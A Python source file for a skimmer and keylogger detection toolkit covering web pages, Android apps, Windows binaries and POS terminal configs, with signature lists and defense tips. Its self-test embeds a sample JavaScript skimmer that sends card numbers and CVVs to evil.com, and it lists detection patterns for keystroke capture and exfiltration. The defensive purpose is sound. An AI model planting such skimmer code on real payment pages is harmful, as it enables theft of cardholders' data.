#!/usr/bin/env python3
"""
Digital Skimmer & Keylogger Detection Toolkit
Detects malicious skimmers and keyloggers on web, mobile, and desktop.
"""
import os
import re
import json
import hashlib
from datetime import datetime
from typing import List, Dict, Optional


# ── Web Skimmer Detection ─────────────────────────────────────────────────

class WebSkimmerDetector:
    """Detects JavaScript skimmers on payment pages."""
    
    SUSPICIOUS_PATTERNS = [
        r"document\.createElement\s*\(\s*['\"]script['\"]",
        r"new\s+Function\s*\(",
        r"eval\s*\(",
        r"atob\s*\(",
        r"unescape\s*\(",
        r"fromCharCode",
        r"\\x[0-9a-fA-F]{2}",
        r"String\.prototype\.",
        r"XMLHttpRequest\.prototype\.",
        r"fetch\s*\.\s*prototype",
        r"addEventListener\s*\(\s*['\"]submit['\"]",
        r"addEventListener\s*\(\s*['\"]click['\"]",
        r"addEventListener\s*\(\s*['\"]keypress['\"]",
        r"addEventListener\s*\(\s*['\"]keydown['\"]",
        r"addEventListener\s*\(\s*['\"]input['\"]",
        r"navigator\.sendBeacon",
        r"localStorage",
        r"sessionStorage",
        r"MutationObserver",
        r"cloneNode",
        r"appendChild",
        r"insertBefore",
    ]
    
    SUSPICIOUS_DOMAINS = [
        r".*\.top$",
        r".*\.xyz$",
        r".*\.pw$",
        r".*\.cc$",
        r".*\.ru$",
        r".*\.cn$",
        r".*\.tk$",
        r".*\.ml$",
        r".*\.ga$",
        r".*\.cf$",
    ]
    
    PAYMENT_KEYWORDS = [
        "card", "credit", "debit", "cvv", "cvc", "expir",
        "payment", "checkout", "billing", "visa", "mastercard",
        "amex", "discover", "stripe", "paypal", "braintree"
    ]
    
    @classmethod
    def scan_html(cls, html: str, url: str = "unknown") -> Dict:
        """Scan HTML content for skimmer indicators."""
        findings = {
            "url": url,
            "timestamp": datetime.now().isoformat(),
            "risk_score": 0,
            "indicators": [],
            "scripts": [],
            "external_domains": [],
            "suspicious": False,
        }
        
        # Extract all script tags
        script_pattern = r'<script[^>]*>(.*?)</script>'
        scripts = re.findall(script_pattern, html, re.DOTALL | re.IGNORECASE)
        
        # Check inline scripts
        for i, script in enumerate(scripts):
            if not script.strip():
                continue
            script_findings = cls._analyze_script(script, i)
            if script_findings:
                findings["scripts"].append(script_findings)
                findings["risk_score"] += script_findings.get("risk_score", 0)
        
        # Extract external script sources
        src_pattern = r'<script[^>]+src=["\']([^"\']+)["\']'
        src_matches = re.findall(src_pattern, html, re.IGNORECASE)
        
        for src in src_matches:
            domain = cls._extract_domain(src)
            if domain:
                findings["external_domains"].append(domain)
                if cls._is_suspicious_domain(domain):
                    findings["indicators"].append(f"Suspicious domain: {domain}")
                    findings["risk_score"] += 20
        
        # Check for payment keywords in forms
        form_pattern = r'<form[^>]*>(.*?)</form>'
        forms = re.findall(form_pattern, html, re.DOTALL | re.IGNORECASE)
        
        for form in forms:
            form_lower = form.lower()
            payment_matches = [kw for kw in cls.PAYMENT_KEYWORDS if kw in form_lower]
            if payment_matches:
                findings["indicators"].append(
                    f"Payment form detected with keywords: {payment_matches}"
                )
                findings["risk_score"] += 10
        
        # Check for obfuscated content
        if cls._is_obfuscated(html):
            findings["indicators"].append("Obfuscated JavaScript detected")
            findings["risk_score"] += 30
        
        findings["suspicious"] = findings["risk_score"] >= 30
        return findings
    
    @classmethod
    def _analyze_script(cls, script: str, index: int) -> Optional[Dict]:
        """Analyze a single script block."""
        result = {
            "index": index,
            "risk_score": 0,
            "patterns_found": [],
            "length": len(script),
        }
        
        for pattern in cls.SUSPICIOUS_PATTERNS:
            matches = re.findall(pattern, script, re.IGNORECASE)
            if matches:
                result["patterns_found"].append({
                    "pattern": pattern,
                    "count": len(matches),
                })
                result["risk_score"] += len(matches) * 5
        
        return result if result["patterns_found"] else None
    
    @classmethod
    def _extract_domain(cls, url: str) -> Optional[str]:
        """Extract domain from URL."""
        from urllib.parse import urlparse
        try:
            parsed = urlparse(url)
            return parsed.netloc
        except:
            return None
    
    @classmethod
    def _is_suspicious_domain(cls, domain: str) -> bool:
        """Check if domain matches suspicious patterns."""
        for pattern in cls.SUSPICIOUS_DOMAINS:
            if re.match(pattern, domain, re.IGNORECASE):
                return True
        return False
    
    @classmethod
    def _is_obfuscated(cls, code: str) -> bool:
        """Detect obfuscated JavaScript."""
        # High ratio of escape sequences
        escape_count = len(re.findall(r'\\x[0-9a-fA-F]{2}', code))
        if escape_count > 10:
            return True
        
        # Very long single lines (packed code)
        lines = code.split('\n')
        for line in lines:
            if len(line) > 1000:
                return True
        
        # High entropy strings
        if re.search(r'[A-Za-z0-9+/]{100,}=?', code):
            return True
        
        return False


# ── Android Keylogger Detection ───────────────────────────────────────────

class AndroidKeyloggerDetector:
    """Detects keyloggers and skimmers on Android devices."""
    
    SUSPICIOUS_PERMISSIONS = [
        "android.permission.BIND_ACCESSIBILITY_SERVICE",
        "android.permission.SYSTEM_ALERT_WINDOW",
        "android.permission.READ_SMS",
        "android.permission.RECEIVE_SMS",
        "android.permission.READ_LOGS",
        "android.permission.READ_CONTACTS",
        "android.permission.RECORD_AUDIO",
        "android.permission.CAMERA",
    ]
    
    SUSPICIOUS_SERVICES = [
        "AccessibilityService",
        "NotificationListenerService",
        "InputMethodService",
    ]
    
    SUSPICIOUS_PACKAGES = [
        "com.android.inputmethod",
        "com.google.android.inputmethod",
    ]
    
    @classmethod
    def scan_apk_manifest(cls, manifest_path: str) -> Dict:
        """Scan AndroidManifest.xml for suspicious permissions."""
        findings = {
            "file": manifest_path,
            "timestamp": datetime.now().isoformat(),
            "risk_score": 0,
            "permissions": [],
            "services": [],
            "suspicious": False,
        }
        
        try:
            with open(manifest_path, 'r', encoding='utf-8') as f:
                content = f.read()
        except Exception as e:
            return {"error": str(e)}
        
        # Check permissions
        for perm in cls.SUSPICIOUS_PERMISSIONS:
            if perm in content:
                findings["permissions"].append(perm)
                findings["risk_score"] += 15
        
        # Check services
        for service in cls.SUSPICIOUS_SERVICES:
            if service in content:
                findings["services"].append(service)
                findings["risk_score"] += 20
        
        findings["suspicious"] = findings["risk_score"] >= 30
        return findings
    
    @classmethod
    def scan_dex_for_keylogger(cls, dex_path: str) -> Dict:
        """Scan DEX file for keylogger patterns."""
        findings = {
            "file": dex_path,
            "timestamp": datetime.now().isoformat(),
            "risk_score": 0,
            "patterns": [],
            "suspicious": False,
        }
        
        # Search for keylogger-related strings in DEX
        keylogger_strings = [
            b"onKeyDown",
            b"onKeyUp",
            b"onTextChanged",
            b"beforeTextChanged",
            b"afterTextChanged",
            b"InputMethodManager",
            b"getInputMethodList",
            b"AccessibilityNodeInfo",
            b"performAction",
            b"ACTION_SET_TEXT",
            b"getText",
            b"setText",
        ]
        
        try:
            with open(dex_path, 'rb') as f:
                content = f.read()
        except Exception as e:
            return {"error": str(e)}
        
        for pattern in keylogger_strings:
            count = content.count(pattern)
            if count > 0:
                findings["patterns"].append({
                    "pattern": pattern.decode('utf-8', errors='ignore'),
                    "count": count,
                })
                findings["risk_score"] += count * 5
        
        findings["suspicious"] = findings["risk_score"] >= 20
        return findings
    
    @classmethod
    def scan_running_processes(cls) -> Dict:
        """Scan running processes for suspicious activity (requires ADB)."""
        findings = {
            "timestamp": datetime.now().isoformat(),
            "risk_score": 0,
            "suspicious_processes": [],
            "suspicious": False,
        }
        
        # This would require ADB access to device
        # Placeholder for actual implementation
        return findings


# ── Windows Keylogger Detection ───────────────────────────────────────────

class WindowsKeyloggerDetector:
    """Detects keyloggers on Windows systems."""
    
    SUSPICIOUS_API_CALLS = [
        "SetWindowsHookEx",
        "SetWindowsHookExW",
        "SetWindowsHookExA",
        "GetAsyncKeyState",
        "GetKeyState",
        "GetKeyboardState",
        "RegisterRawInputDevices",
        "RegisterDeviceNotification",
        "CreateRemoteThread",
        "WriteProcessMemory",
        "VirtualAllocEx",
        "NtQueueApcThread",
        "SetThreadContext",
    ]
    
    SUSPICIOUS_DLLS = [
        "user32.dll",
        "kernel32.dll",
        "ntdll.dll",
        "win32k.sys",
        "kbdclass.sys",
    ]
    
    PERSISTENCE_LOCATIONS = [
        r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run",
        r"HKLM\Software\Microsoft\Windows\CurrentVersion\Run",
        r"HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce",
        r"HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce",
    ]
    
    @classmethod
    def scan_file_for_keylogger(cls, file_path: str) -> Dict:
        """Scan a PE file for keylogger indicators."""
        findings = {
            "file": file_path,
            "timestamp": datetime.now().isoformat(),
            "risk_score": 0,
            "imports": [],
            "strings": [],
            "suspicious": False,
        }
        
        try:
            with open(file_path, 'rb') as f:
                content = f.read()
        except Exception as e:
            return {"error": str(e)}
        
        # Check for suspicious API imports
        for api in cls.SUSPICIOUS_API_CALLS:
            if api.encode() in content:
                findings["imports"].append(api)
                findings["risk_score"] += 10
        
        # Check for suspicious strings
        suspicious_strings = [
            b"keylog",
            b"keystroke",
            b"screenshot",
            b"clipboard",
            b"password",
            b"credential",
            b"GET /log",
            b"POST /log",
        ]
        
        for s in suspicious_strings:
            if s in content.lower():
                findings["strings"].append(s.decode('utf-8', errors='ignore'))
                findings["risk_score"] += 15
        
        findings["suspicious"] = findings["risk_score"] >= 25
        return findings
    
    @classmethod
    def scan_registry_persistence(cls) -> Dict:
        """Scan Windows registry for persistence mechanisms."""
        findings = {
            "timestamp": datetime.now().isoformat(),
            "risk_score": 0,
            "entries": [],
            "suspicious": False,
        }
        
        try:
            import winreg
            
            # Check Run keys
            keys_to_check = [
                (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run"),
                (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run"),
            ]
            
            for hive, path in keys_to_check:
                try:
                    key = winreg.OpenKey(hive, path, 0, winreg.KEY_READ)
                    i = 0
                    while True:
                        try:
                            name, value, _ = winreg.EnumValue(key, i)
                            findings["entries"].append({
                                "hive": "HKCU" if hive == winreg.HKEY_CURRENT_USER else "HKLM",
                                "path": path,
                                "name": name,
                                "value": str(value)[:100],
                            })
                            i += 1
                        except WindowsError:
                            break
                    winreg.CloseKey(key)
                except Exception as e:
                    findings["entries"].append({"error": str(e)})
        
        except ImportError:
            findings["error"] = "winreg not available (not on Windows)"
        
        return findings
    
    @classmethod
    def scan_running_processes(cls) -> Dict:
        """Scan running processes for suspicious activity."""
        findings = {
            "timestamp": datetime.now().isoformat(),
            "risk_score": 0,
            "processes": [],
            "suspicious": False,
        }
        
        try:
            import psutil
            
            for proc in psutil.process_iter(['pid', 'name', 'cmdline', 'connections']):
                try:
                    pinfo = proc.info
                    suspicious = False
                    reasons = []
                    
                    # Check for suspicious names
                    name_lower = pinfo['name'].lower()
                    if any(x in name_lower for x in ['keylog', 'hook', 'capture', 'spy']):
                        suspicious = True
                        reasons.append("Suspicious process name")
                    
                    # Check for suspicious command line
                    if pinfo['cmdline']:
                        cmd = ' '.join(pinfo['cmdline']).lower()
                        if any(x in cmd for x in ['keylog', 'hook', 'capture', 'spy']):
                            suspicious = True
                            reasons.append("Suspicious command line")
                    
                    if suspicious:
                        findings["processes"].append({
                            "pid": pinfo['pid'],
                            "name": pinfo['name'],
                            "reasons": reasons,
                        })
                        findings["risk_score"] += 20
                
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    continue
        
        except ImportError:
            findings["error"] = "psutil not available"
        
        findings["suspicious"] = findings["risk_score"] >= 20
        return findings


# ── POS Terminal Security Auditor ─────────────────────────────────────────

class POSTerminalAuditor:
    """Audits POS terminals for skimming vulnerabilities."""
    
    @classmethod
    def scan_bluetooth(cls) -> Dict:
        """Scan for Bluetooth devices near POS terminals."""
        findings = {
            "timestamp": datetime.now().isoformat(),
            "risk_score": 0,
            "devices": [],
            "suspicious": False,
        }
        
        # Would require pybluez or similar
        # Placeholder for actual implementation
        return findings
    
    @classmethod
    def check_firmware_hash(cls, terminal_id: str, expected_hash: str, actual_hash: str) -> Dict:
        """Verify terminal firmware integrity."""
        return {
            "terminal_id": terminal_id,
            "expected_hash": expected_hash,
            "actual_hash": actual_hash,
            "match": expected_hash == actual_hash,
            "tampered": expected_hash != actual_hash,
            "timestamp": datetime.now().isoformat(),
        }
    
    @classmethod
    def audit_terminal_config(cls, config: Dict) -> Dict:
        """Audit terminal configuration for security issues."""
        findings = {
            "timestamp": datetime.now().isoformat(),
            "risk_score": 0,
            "issues": [],
            "suspicious": False,
        }
        
        # Check for debug mode
        if config.get("debug_mode", False):
            findings["issues"].append("Debug mode enabled")
            findings["risk_score"] += 20
        
        # Check for unencrypted storage
        if not config.get("encrypt_storage", True):
            findings["issues"].append("Storage encryption disabled")
            findings["risk_score"] += 30
        
        # Check for network isolation
        if not config.get("network_isolation", True):
            findings["issues"].append("Network isolation disabled")
            findings["risk_score"] += 25
        
        # Check for tamper detection
        if not config.get("tamper_detection", True):
            findings["issues"].append("Tamper detection disabled")
            findings["risk_score"] += 35
        
        findings["suspicious"] = findings["risk_score"] >= 30
        return findings


# ── MCP Tool Functions ────────────────────────────────────────────────────

def scan_webpage_for_skimmers(html: str, url: str = "unknown") -> str:
    """Scan a webpage for JavaScript skimmer indicators."""
    result = WebSkimmerDetector.scan_html(html, url)
    return json.dumps(result, indent=2)


def scan_apk_for_keylogger(manifest_path: str) -> str:
    """Scan Android APK manifest for keylogger indicators."""
    result = AndroidKeyloggerDetector.scan_apk_manifest(manifest_path)
    return json.dumps(result, indent=2)


def scan_windows_file_for_keylogger(file_path: str) -> str:
    """Scan a Windows PE file for keylogger indicators."""
    result = WindowsKeyloggerDetector.scan_file_for_keylogger(file_path)
    return json.dumps(result, indent=2)


def scan_windows_persistence() -> str:
    """Scan Windows registry for keylogger persistence."""
    result = WindowsKeyloggerDetector.scan_registry_persistence()
    return json.dumps(result, indent=2)


def audit_pos_terminal(config: Dict) -> str:
    """Audit POS terminal configuration for security issues."""
    result = POSTerminalAuditor.audit_terminal_config(config)
    return json.dumps(result, indent=2)


def get_skimmer_signatures() -> str:
    """Return known skimmer signatures and IOCs."""
    signatures = {
        "magecart_groups": {
            "group_1": {
                "targets": "British Airways, Ticketmaster, Newegg",
                "technique": "Supply chain, compromised CDN",
                "domains": ["baways.com", "ticketmaster.co.uk.co"],
            },
            "group_2": {
                "targets": "E-commerce platforms",
                "technique": "Magento/WordPress plugin injection",
                "domains": ["analytics-ssl.com", "googletagmanager.com.co"],
            },
            "group_3": {
                "targets": "Small/medium e-commerce",
                "technique": "Automated scanning for vulnerable plugins",
                "domains": ["jquery-code.com", "bootstrapcdn.co"],
            },
            "group_4": {
                "targets": "Multiple sectors",
                "technique": "AJAX-based persistent backdoors",
                "domains": ["stats-analytics.com", "web-analytics.co"],
            },
        },
        "android_skimmers": {
            "cerberus": {
                "type": "Overlay + RAT + keylogger",
                "targets": "17 banking apps",
                "c2": "Telegram bot",
            },
            "anatsa": {
                "type": "Dropper + form grabber",
                "targets": "US banks",
                "c2": "Firebase",
            },
            "ermac": {
                "type": "VNC + form grabber",
                "targets": "370+ apps",
                "c2": "WebSocket",
            },
        },
        "detection_rules": {
            "yara": [
                "rule Magecart_JS { strings: $s1 = \"card\" nocase; $s2 = \"cvv\" nocase; $s3 = \"eval\"; condition: all of them }",
            ],
            "sigma": [
                "title: Keylogger Registry Persistence\nlogsource:\n  category: registry_event\ndetection:\n  selection:\n    TargetObject|contains: '\\\\CurrentVersion\\\\Run'",
            ],
        },
    }
    return json.dumps(signatures, indent=2)


def get_defense_recommendations() -> str:
    """Return comprehensive defense recommendations."""
    recommendations = {
        "web_applications": [
            "Implement strict Content Security Policy (CSP)",
            "Use Subresource Integrity (SRI) for all external scripts",
            "Deploy client-side monitoring (e.g., HUMAN, PerimeterX)",
            "Regular security audits and penetration testing",
            "File integrity monitoring on all web assets",
            "Use a Web Application Firewall (WAF)",
        ],
        "android_devices": [
            "Enable Google Play Protect",
            "Disable installation from unknown sources",
            "Review Accessibility Services regularly",
            "Check overlay permissions (SYSTEM_ALERT_WINDOW)",
            "Use hardware security keys for 2FA",
            "Keep OS and apps updated",
        ],
        "windows_systems": [
            "Enable Windows Defender Credential Guard",
            "Use Windows Hello for biometric login",
            "Enable Secure Boot and TPM",
            "Use Application Control (WDAC)",
            "Enable Attack Surface Reduction rules",
            "Deploy EDR solution (CrowdStrike, SentinelOne)",
        ],
        "pos_terminals": [
            "Use end-to-end encryption (P2PE)",
            "Implement tamper-evident seals",
            "Regular physical audits",
            "Bluetooth scanning for wireless skimmers",
            "Firmware hash verification",
            "Network monitoring for unexpected traffic",
        ],
    }
    return json.dumps(recommendations, indent=2)


if __name__ == "__main__":
    # Test the detectors
    print("=== Web Skimmer Detector Test ===")
    test_html = """
    <html>
    <head>
        <script src="https://suspicious-domain.top/analytics.js"></script>
    </head>
    <body>
        <form id="payment-form">
            <input type="text" id="card-number" placeholder="Card Number">
            <input type="text" id="cvv" placeholder="CVV">
            <input type="text" id="expiry" placeholder="MM/YY">
        </form>
        <script>
            document.getElementById('payment-form').addEventListener('submit', function(e) {
                var card = document.getElementById('card-number').value;
                var cvv = document.getElementById('cvv').value;
                fetch('https://evil.com/collect', {
                    method: 'POST',
                    body: JSON.stringify({card: card, cvv: cvv})
                });
            });
        </script>
    </body>
    </html>
    """
    result = scan_webpage_for_skimmers(test_html, "https://test-store.com/checkout")
    print(result)
    
    print("\n=== Skimmer Signatures ===")
    print(get_skimmer_signatures()[:500])
    
    print("\n=== Defense Recommendations ===")
    print(get_defense_recommendations()[:500])
